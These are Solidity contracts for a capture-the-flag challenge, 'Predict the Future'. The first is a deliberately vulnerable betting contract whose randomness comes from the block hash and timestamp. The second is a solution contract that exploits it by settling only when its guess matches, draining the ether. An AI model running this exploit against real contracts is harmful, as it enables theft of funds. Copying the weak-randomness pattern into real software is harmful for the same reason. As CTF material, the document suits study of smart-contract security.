pragma solidity ^0.4.21;

contract PredictTheFutureChallenge {
    address guesser;
    uint8 guess;
    uint256 settlementBlockNumber;

    function PredictTheFutureChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(uint8 n) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = n;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

pragma solidity ^0.4.21;

contract PredictTheFutureSolution {
    function() public payable { }

    address contractAddress = 0xdbCC0546462A39808DC2AB102890f427e03716d6;
    PredictTheFutureChallenge challenge = PredictTheFutureChallenge(contractAddress);
    uint8 guessedNumber = 8; //any digit from 0 to 9

    function lock() public payable {  
        require(msg.value == 1 ether);
        challenge.lockInGuess.value(msg.value)(guessedNumber);   
    }

    function settle() public {
        require(guessedNumber == uint8(keccak256(block.blockhash(block.number - 1), now)) % 10);
        challenge.settle();
    }

    function destroy() public {
        selfdestruct(msg.sender);
    }
}